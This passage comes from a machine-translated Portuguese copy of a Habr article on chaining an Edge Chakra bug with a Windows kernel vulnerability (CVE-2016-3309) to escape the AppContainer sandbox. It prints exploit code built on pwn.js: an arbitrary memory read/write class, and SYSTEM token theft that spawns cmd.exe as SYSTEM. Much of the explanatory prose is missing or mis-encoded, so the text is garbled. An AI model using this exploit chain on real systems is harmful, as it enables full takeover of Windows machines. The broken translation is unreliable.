<code>CFG</code> , n√£o impede o uso de cadeias <code>ROP</code> . </p><br><h3 id="appcontainer-isolation">  Isolamento do AppContainer </h3><br><blockquote>  AppContainer √© uma tecnologia da Microsoft que permite isolar um processo executando-o em um ambiente em √°rea restrita.  Essa tecnologia restringe o acesso de um processo a credenciais, dispositivos, um sistema de arquivos, uma rede, outros processos e janelas e visa minimizar os recursos de malware que t√™m a capacidade de executar c√≥digo arbitr√°rio em um processo. </blockquote><p>  Essa prote√ß√£o complica muito o processo de opera√ß√£o.  Por esse motivo, n√£o podemos chamar arquivos execut√°veis ‚Äã‚Äãde terceiros nem acessar informa√ß√µes confidenciais do usu√°rio na mem√≥ria ou em discos.  No entanto, essa prote√ß√£o pode ser superada explorando vulnerabilidades na implementa√ß√£o da caixa de prote√ß√£o AppContainer ou aumentando os privil√©gios atrav√©s da explora√ß√£o de vulnerabilidades no kernel do SO. </p><br><p>  Vale ressaltar que a <code>Microsoft</code> possui um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">programa de recompensa</a> separado para t√©cnicas para contornar <code>security mitigation</code> tecnologias de <code>security mitigation</code> .  O programa indica que a reutiliza√ß√£o de c√≥digo execut√°vel (a constru√ß√£o de cadeias <code>ROP</code> √© uma varia√ß√£o dessa t√©cnica) n√£o se enquadra no programa, porque  √© uma quest√£o arquitet√¥nica. </p><br><h3 id="ispolzovanie-pwnjs">  Usando pwn.js </h3><br><p>  A partir de uma an√°lise de todas as tecnologias de seguran√ßa, segue-se que, para poder executar c√≥digo arbitr√°rio, voc√™ precisa ignorar a caixa de prote√ß√£o do <code>AppContainer</code> .  Neste artigo, descrevemos um m√©todo usando uma vulnerabilidade no kernel do <code>Windows</code> .  Nesse caso, podemos usar apenas c√≥digo <code>JS</code> e cadeias <code>ROP</code> .  Escrever uma explora√ß√£o para o kernel usando apenas cadeias <code>ROP</code> pode ser muito dif√≠cil.  Para simplificar essa tarefa, voc√™ pode encontrar um conjunto de gadgets com os quais poder√≠amos chamar os m√©todos <code>WinAPI</code> necess√°rios.  Felizmente, isso j√° est√° implementado na biblioteca <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><code>pwn.js</code></a>  Usando-o, tendo descrito apenas as fun√ß√µes de leitura e grava√ß√£o para leitura e grava√ß√£o arbitr√°rias, voc√™ pode obter uma <code>API</code> conveniente para encontrar as fun√ß√µes <code>WinAPI</code> necess√°rias e cham√°-las.  <code>pwn.js</code> tamb√©m fornece uma ferramenta conveniente para trabalhar com valores de 64 bits e ponteiros e ferramentas para trabalhar com estruturas. </p><br><p>  Considere um exemplo simples.  Na etapa anterior, obtivemos uma cadeia de dois <code>DataView</code> relacionados.  Para preparar a explora√ß√£o, voc√™ deve criar a seguinte classe: </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Exploit = (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ChakraExploit = pwnjs.ChakraExploit; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Integer = pwnjs.Integer; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Exploit</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ChakraExploit.call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); ... <span class="hljs-comment"><span class="hljs-comment">//  arbitrary address read/write    ... // DataView,         this.dv = ...; // DataView,     this.dv this.dv_offset = ...; //    Chakra.dll, ,     var vtable = ...; this.initChakra(vtable); } Exploit.prototype = Object.create(ChakraExploit.prototype); Exploit.prototype.constructor = Exploit; Exploit.prototype.set_dv_address = function(lo, hi) { this.dv_offset.setInt32(0x38, lo, true); this.dv_offset.setInt32(0x3c, hi, true); } Exploit.prototype.read = function (address, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: return new Integer(this.dv.getInt8(0, true), 0, true); case 16: return new Integer(this.dv.getInt16(0, true), 0, true); case 32: return new Integer(this.dv.getInt32(0, true), 0, true); case 64: return new Integer(this.dv.getInt32(0, true), this.dv.getInt32(4, true), true); } } Exploit.prototype.write = function (address, value, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: this.dv.setInt8(0, value.low, true); break; case 16: this.dv.setInt16(0, value.low, true); break; case 32: this.dv.setInt32(0, value.low, true); break; case 64: this.dv.setInt32(0, value.low, true); this.dv.setInt32(4, value.high, true); break; } } return Exploit; })();</span></span></code> </pre> <br><p>     ,      <code>MessageBoxA</code> : </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Exploit()) { <span class="hljs-comment"><span class="hljs-comment">//alert('Chakra: ' + chakraBase.toString(16)); var MessageBoxA = importFunction('user32.dll', 'MessageBoxA', Int32); var GetActiveWindow = importFunction('user32.dll', 'GetActiveWindow', Int64); var hwnd = GetActiveWindow(); var ret = MessageBoxA(hwnd, new CString('PWNED'), new CString('PWNED'), 0); } }</span></span></code> </pre> <br><p>      : </p><br><p><img src="https://habrastorage.org/webt/vm/zb/t1/vmzbt1z0du0bnjto8mxpwzo9hac.png" alt="PWNED"></p><br><h2 id="shag-3-povyshenie-privilegiy-i-vyhod-iz-pesochnicy-s-pomoschyu-uyazvimosti-yadra">  3.           </h2><br><p>         <code>WinAPI</code> .         .      <code>CVE-2016-3309</code> .         [7]  [8],     <code>pwn.js</code> [2]    ,        <code>GDI</code> -.         [9], [10]  [11].              .        ,      .       ,                <code>AppContainer</code> ,          <code>pwn.js</code> .           <code>cmd.exe</code>    <code>SYSTEM</code> . </p><br><blockquote> GDI ‚Äî   Windows          , ,    . </blockquote><p> ,             . <code>JS</code> -     64-     <code>kernel_read_64</code>  <code>kernel_write_64</code> , .        Windows.           <code>BITMAP</code> ,    . <code>pwn.js</code>     .  <code>BITMAP</code>  , , : </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> BITMAP = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StructType([ [<span class="hljs-string"><span class="hljs-string">'poolHeader'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayType(Uint32, <span class="hljs-number"><span class="hljs-number">4</span></span>)], <span class="hljs-comment"><span class="hljs-comment">// BASEOBJECT64 ['hHmgr', Uint64], ['ulShareCount', Uint32], ['cExclusiveLock', Uint16], ['BaseFlags', Uint16], ['Tid', Uint64], ['dhsurf', Uint64], ['hsurf', Uint64], ['dhpdev', Uint64], ['hdev', Uint64], ['sizlBitmap', SIZEL], ['cjBits', Uint32], ['pvBits', Uint64], ['pvScan0', Uint64], ]);</span></span></code> </pre> <br><p>  <code>Tid</code>       <code>KTHREAD</code>     , ,   ,   <code>EmpCheckErrataList</code> ,        .  ,        : </p><br><pre> <code class="javascript hljs">... var nt_EmpCheckErrataList_ptr = worker_bitmap_obj.Tid.add(<span class="hljs-number"><span class="hljs-number">0x2a8</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> nt_EmpCheckErrataList = kernel_read_64(nt_EmpCheckErrataList_ptr); <span class="hljs-comment"><span class="hljs-comment">/* g_config   ,         empCheckErrataList  WinDbg        : ? nt!EmpCheckErrataList - nt */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ntoskrnl_base_address = nt_EmpCheckErrataList.sub( g_config.nt_empCheckErrataList_offset); ...</code> </pre> <br><p>    ,     <code>AppContainer</code>    .    <code>AppContainer</code>    <code>IsPackagedProcess</code>     ( <code>Process Environment Block</code> , <code>PEB</code> ),         .    <code>Access Token</code> ,         <code>AppContainer</code> .       <code>Access Token</code>  ,         . <code>Access Token</code>     ,     .     <code>EPROCESS</code>    <code>ActiveProcessLinks</code> ,       .   <code>PEB</code>     <code>EPROCESS</code> .          <code>PsInitialSystemProcess</code> ,   ,         <code>ActiveProcessLinks</code> . </p><br><p>    <code>Edge</code>    :      ,    <code>Edge</code>       .              <code>SYSTEM</code> .   , , <code>winlogon.exe</code> . </p><br><p>        <code>pwn.js</code>  : </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//  PEB   var pinfo = _PROCESS_BASIC_INFORMATION.Ptr.cast(malloc(_PROCESS_BASIC_INFORMATION.size)); var pinfo_sz = Uint64.Ptr.cast(malloc(8)); NtQueryInformationProcess(GetCurrentProcess(), 0, pinfo, _PROCESS_BASIC_INFORMATION.size, pinfo_sz); var peb = pinfo.PebBaseAddress; /*    IsPackagedProcess       peb   char * */ var bit_field = peb[3]; bit_field = bit_field.xor(1 &lt;&lt; 4); peb[3] = bit_field; /*             WinDbg    .     : dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks           */ var ActiveProcessLinks = system_eprocess.add( g_config.ActiveProcessLinksOffset); var current_pid = GetCurrentProcessId(); var current_eprocess = null; var winlogon_pid = null; // winlogon.exe -  ,     cmd.exe var winlogon = new CString("winlogon.exe"); var image_name = malloc(16); var system_pid = kernel_read_64(system_eprocess.add( g_config.UniqueProcessIdOffset)); while(!current_eprocess || !winlogon_pid) { var eprocess = kernel_read_64(ActiveProcessLinks).sub( g_config.ActiveProcessLinksOffset); var pid = kernel_read_64(eprocess.add( g_config.UniqueProcessIdOffset)); //        //   Uint64.store( image_name.address, kernel_read_64(eprocess.add(g_config.ImageNameOffset)) ); Uint64.store( image_name.address.add(8), kernel_read_64(eprocess.add(g_config.ImageNameOffset + 8)) ); //   winlogon.exe    if(_stricmp(winlogon, image_name).eq(0)) { winlogon_pid = pid; } if (current_pid.eq(pid)) { current_eprocess = eprocess; } //        ActiveProcessLinks = eprocess.add( g_config.ActiveProcessLinksOffset); } //     var sys_token = kernel_read_64(system_eprocess.add(g_config.TokenOffset)); //          //   winlogon.exe var pi = malloc(24); memset(pi, 0, 24); var si = malloc(104 + 8); memset(si, 0, 104 + 8); Uint32.store(si.address, new Integer(104 + 8)); var args = WString("cmd.exe"); var AttributeListSize = Uint64.Ptr.cast(malloc(8)); InitializeProcThreadAttributeList(0, 1, 0, AttributeListSize); var lpAttributeList = malloc(AttributeListSize[0]); Uint64.store( si.address.add(104), lpAttributeList ); InitializeProcThreadAttributeList(lpAttributeList, 1, 0, AttributeListSize) var winlogon_handle = Uint64.Ptr.cast(malloc(8)); //       kernel_write_64(current_eprocess.add(g_config.TokenOffset), sys_token); /*        AppContainer,       winlogon.exe         winlogon.exe */ winlogon_handle[0] = OpenProcess(PROCESS_ALL_ACCESS, 0, winlogon_pid); UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, winlogon_handle, 8, 0, 0); CreateProcess(0, args, 0, 0, 0, EXTENDED_STARTUPINFO_PRESENT, 0, 0, si, pi);</span></span></code> </pre> <br><p>     : </p><br><p><img src="https://habrastorage.org/webt/r4/4j/lm/r44jlmrlc0reurbxe-rosf1cicu.png" alt="Final"></p><br><p>   YouTube    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="></a>  ,     Microsoft Edge. </p><br><h2 id="itog">  Sum√°rio </h2><br><p>   : </p><br><ul><li> ,       <code>Edge</code>   <code>Windows</code> ,   13   ,        <code>CVE-2017-0240</code>  ,   .          <code>CVE-2016-3309</code> . </li><li>      <code>JS</code> </li><li>    666    <code>JS</code> </li><li>   :  <code>cmd.exe</code>    <code>SYSTEM</code> ,        </li></ul><br><p>   ,         ,                 .  ,       ,         .        . </p><br><h2 id="materialy">  </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Liu Jin ‚Äî The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Andrew Wesie, Brian Pak ‚Äî 1-Day Browser &amp; Kernel <br> Exploitation</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Natalie Silvanovich ‚Äî The ECMA and the Chakra. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Natalie Silvanovich ‚Äî Your Chakra Is Not Aligned. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="">phoenhex team ‚Äî cve-2018-8629-chakra.js</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Quarkslab ‚Äî Exploiting MS16-145: MS Edge TypedArray.sort Use-After-Free (CVE-2016-7288)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Siberas ‚Äî Kernel Exploitation Case Study ‚Äî "Wild" Pool Overflow on Win10 x64 RS2 (CVE-2016-3309 Reloaded)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Saif El-Sherei ‚Äî Demystifying Windows Kernel Exploitation by Abusing GDI Objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Diego Juarez ‚Äî Abusing GDI for ring0 exploit primitives</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Nicolas A. Economou ‚Äî Abusing GDI for ring0 exploit <br> primitives: Evolution</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">pwn.js</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt455594/">https://habr.com/ru/post/pt455594/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt455584/index.html">Entrevistas personalizadas com as for√ßas internas da empresa: atrav√©s de erros para descobertas</a></li>
<li><a href="../pt455586/index.html">S√©rie de palestras sobre rob√≥tica do professor Gregor Sch√∂ner, diretor do Instituto de Neuroinform√°tica (INI) Bochum, Alemanha</a></li>
<li><a href="../pt455588/index.html">Como educar sua comunidade para n√£o dan√ßar com um pandeiro</a></li>
<li><a href="../pt455590/index.html">MVCC no PostgreSQL-8. Congelamento</a></li>
<li><a href="../pt455592/index.html">V√≠rus atacam empresas industriais como amea√ßa √† seguran√ßa f√≠sica</a></li>
<li><a href="../pt455596/index.html">DevConfX :: Management - relat√≥rios de gerentes em palavras simples</a></li>
<li><a href="../pt455598/index.html">Atualize urgentemente o Exim para 4.92 - h√° uma infec√ß√£o ativa</a></li>
<li><a href="../pt455600/index.html">Plataforma 3DEXPERIENCE ajuda a criar transporte p√∫blico do futuro</a></li>
<li><a href="../pt455602/index.html">Provocando Falhas no Navegador com Fuzzing Comportamental</a></li>
<li><a href="../pt455604/index.html">Respons√°vel por gerenciar a configura√ß√£o do Windows. Hist√≥ria de sucesso</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>